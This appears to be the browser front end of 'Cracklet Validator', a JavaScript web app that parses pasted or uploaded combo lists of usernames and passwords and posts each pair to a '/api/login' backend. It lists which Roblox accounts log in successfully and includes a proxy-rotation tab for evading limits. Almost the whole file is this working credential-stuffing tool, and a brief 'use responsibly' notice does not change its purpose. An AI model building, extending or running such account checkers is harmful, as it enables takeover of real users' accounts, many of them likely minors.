let userName = localStorage.getItem('username') || null;
let format = { site: -1, username: -1, password: -1 };
let parsedLines = [];
let checkingIndex = 0;
let validAccounts = [];
let invalidAccounts = [];
let proxies = [];

function renderNameScreen() {
  document.body.innerHTML = `
    <div class="name-screen">
      <h1>Enter your name...</h1>
      <input id="nameInput" placeholder="Enter your name..." autocomplete="off" autofocus>
      <button id="continueBtn">Continue</button>
    </div>
  `;

  document.getElementById('continueBtn').onclick = saveName;
  document.getElementById('nameInput').addEventListener('keydown', e => {
    if (e.key === 'Enter') saveName();
  });
}

function saveName() {
  const name = document.getElementById('nameInput').value.trim();
  if (name) {
    localStorage.setItem('username', name);
    userName = name;
    renderMainScreen();
  }
}

function renderMainScreen() {
  document.body.innerHTML = `
    <div class="app-container" style="display:flex; height:100vh; font-family:sans-serif;">
      <nav style="width: 200px; background: #222; color: white; padding: 1rem;">
        <h2 style="color:#7fff7f;">Welcome, ${userName}</h2>
        <ul style="list-style:none; padding:0;">
          <li><button class="tab-btn active" data-tab="validator" style="width:100%; padding:10px; margin-bottom:5px;">Validator</button></li>
          <li><button class="tab-btn" data-tab="proxy" style="width:100%; padding:10px; margin-bottom:5px;">Proxy Config</button></li>
          <li><button class="tab-btn" data-tab="about" style="width:100%; padding:10px;">About</button></li>
        </ul>
        <button style="margin-top:2rem; width:100%; background:#7f7fff; border:none; padding:10px; color:white; cursor:pointer;" onclick="logout()">Logout</button>
      </nav>

      <main style="flex:1; background:#121212; color:#ccc; padding:1rem; overflow-y:auto;">
        <section id="validator" class="tab-content">
          <h1>Credential Validator</h1>

          <textarea id="credInput" rows="8" cols="60" placeholder="Paste your credentials here..."></textarea><br>
          <input type="file" id="fileInput"><br>
          <button onclick="previewData()" style="margin: 10px 0;">Preview & Assign Format</button>

          <div id="previewArea"></div>
          <div id="siteSelect" class="hidden" style="margin-top:10px;">
            <h2>Site: <img src="https://cdn.worldvectorlogo.com/logos/roblox.svg" style="width:20px;vertical-align:middle;"> Roblox</h2>
            <button onclick="startValidation()">Validate Credentials</button>
          </div>

          <div id="progress" class="progress" style="margin-top:15px;">Checked 0 / 0 accounts</div>
          <div id="results"></div>
        </section>

        <section id="proxy" class="tab-content" style="display:none;">
          <h1>Proxy Configuration</h1>
          <p>Enter your proxies, one per line (format: ip:port or ip:port:user:pass):</p>
          <textarea id="proxyInput" rows="10" cols="60" placeholder="127.0.0.1:8080\n192.168.0.1:3128:user:pass"></textarea><br>
          <button onclick="saveProxies()">Save Proxies</button>
          <p id="proxyStatus" style="margin-top:10px; color:#7fff7f;"></p>
        </section>

        <section id="about" class="tab-content" style="display:none;">
          <h1>About Cracklet Validator</h1>
          <p>This app lets you validate Roblox account credentials by checking if usernames exist. Password verification is limited by Roblox API restrictions.</p>
          <p>Backend hosted on Vercel serverless functions.</p>
          <p>Proxy configuration lets you add proxy addresses for future proxy-enabled validation (not yet implemented).</p>
          <p>Use responsibly and comply with Roblox's terms of service.</p>
        </section>
      </main>
    </div>
  `;

  // Tab button event listeners
  document.querySelectorAll('.tab-btn').forEach(btn => {
    btn.onclick = () => {
      document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
      btn.classList.add('active');
      const tab = btn.dataset.tab;
      document.querySelectorAll('.tab-content').forEach(sec => {
        sec.style.display = sec.id === tab ? 'block' : 'none';
      });
    };
  });

  // Load proxies if saved
  const saved = localStorage.getItem('proxies');
  if (saved) {
    proxies = JSON.parse(saved);
    document.getElementById('proxyInput').value = proxies.join('\n');
  }
}

function saveProxies() {
  const input = document.getElementById('proxyInput').value.trim();
  proxies = input.split('\n').map(p => p.trim()).filter(p => p.length > 0);
  localStorage.setItem('proxies', JSON.stringify(proxies));
  document.getElementById('proxyStatus').textContent = `Saved ${proxies.length} proxies.`;
}

function logout() {
  localStorage.removeItem('username');
  location.reload();
}

function previewData() {
  let input = document.getElementById('credInput').value.trim();
  const file = document.getElementById('fileInput').files[0];

  if (file) {
    const reader = new FileReader();
    reader.onload = e => {
      input = e.target.result;
      processPreview(input);
    };
    reader.readAsText(file);
  } else {
    processPreview(input);
  }
}

function processPreview(data) {
  parsedLines = data.split('\n').filter(line => line.trim() !== '');
  if (parsedLines.length === 0) return alert('No valid lines found.');

  const delimiter = parsedLines[0].includes(':') ? ':' :
                    parsedLines[0].includes(',') ? ',' :
                    parsedLines[0].includes('|') ? '|' : null;

  if (!delimiter) return alert('No recognizable delimiter found (try : , or |)');

  const firstTokens = parsedLines[0].split(delimiter);

  let previewHTML = `<h2>Assign Format:</h2><div class="preview-line" style="margin-bottom:10px;">`;
  firstTokens.forEach((token, idx) => {
    previewHTML += `
      <div style="display:inline-block; margin:5px;">
        <div class="token" style="background:#333; padding:5px 10px; border-radius:4px;">${token}</div>
        <select onchange="setFormat(${idx}, this.value)">
          <option value="">None</option>
          <option value="site">Site</option>
          <option value="username">Username</option>
          <option value="password">Password</option>
        </select>
      </div>
    `;
  });
  previewHTML += `</div>`;

  previewHTML += `<pre style="margin-top:1rem; text-align:left; background:#222; padding:10px; border-radius:5px; max-height:120px; overflow:auto;">${parsedLines.slice(0,3).join('\n')}</pre>`;

  document.getElementById('previewArea').innerHTML = previewHTML;
  document.getElementById('siteSelect').classList.remove('hidden');
}

function setFormat(index, role) {
  for (const key in format) {
    if (format[key] === index) format[key] = -1;
  }
  if (role) format[role] = index;
}

async function startValidation() {
  if (format.username === -1 || format.password === -1) {
    return alert('Please assign Username and Password fields before validation.');
  }

  validAccounts = [];
  invalidAccounts = [];
  checkingIndex = 0;

  document.getElementById('results').innerHTML = '';
  updateProgress();

  for (let i = 0; i < parsedLines.length; i++) {
    const delimiter = parsedLines[0].includes(':') ? ':' :
                      parsedLines[0].includes(',') ? ',' :
                      '|';

    const parts = parsedLines[i].split(delimiter);
    const username = parts[format.username]?.trim();
    const password = parts[format.password]?.trim();

    if (!username || !password) continue;

    try {
      // Pick random proxy (not implemented backend side, just placeholder)
      // const proxy = proxies.length > 0 ? proxies[Math.floor(Math.random() * proxies.length)] : null;

      const res = await fetch('/api/login', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ username, password /*, proxy*/ }),
      });

      const data = await res.json();

      if (data.valid) {
        validAccounts.push({ username, password, userId: data.userId });
      } else {
        invalidAccounts.push({ username, password, userId: data.userId || 0 });
      }
    } catch (e) {
      // treat fetch failure as invalid
      invalidAccounts.push({ username, password, userId: 0 });
    }

    checkingIndex++;
    updateProgress();
    renderResults();
  }
}

function updateProgress() {
  const total = parsedLines.length;
  document.getElementById('progress').textContent = `Checked ${checkingIndex} / ${total} accounts`;
}

function renderResults() {
  let html = '';

  if (validAccounts.length) {
    html += `<h2 style="color:#7fff7f;">✅ Valid Accounts</h2>`;
    validAccounts.forEach(user => {
      html += resultCard(user, 'green');
    });
  }

  if (invalidAccounts.length) {
    html += `<h2 style="color:#ff7f7f;">❌ Invalid Accounts</h2>`;
    invalidAccounts.forEach(user => {
      html += resultCard(user, 'red');
    });
  }

  document.getElementById('results').innerHTML = html;
}

function resultCard(user, colorClass) {
  // Use user.userId if >0 else default avatar image (grayscale)
  const imgUrl = user.userId > 0
    ? `https://www.roblox.com/headshot-thumbnail/image?userId=${user.userId}&width=150&height=150&format=png`
    : 'https://www.roblox.com/assets/images/avatar-placeholder.png';

  return `
    <div class="result-card" style="display:flex; align-items:center; background:#222; padding:10px; margin-bottom:10px; border-radius:6px;">
      <img src="${imgUrl}" alt="avatar" style="width:60px; height:60px; border-radius:30px; margin-right:15px;">
      <div>
        <a href="https://www.roblox.com/users/${user.userId}/profile" target="_blank" class="profile-link" style="color:${colorClass}; font-weight:bold; font-size:1.1rem; text-decoration:none;">
          ${user.username}
        </a><br>
        <span class="password" style="color:#aaa; cursor:pointer; user-select:none;" onclick="this.textContent = this.textContent === '••••••••' ? '${user.password}' : '••••••••'">••••••••</span>
      </div>
    </div>
  `;
}

// Init
userName ? renderMainScreen() : renderNameScreen();
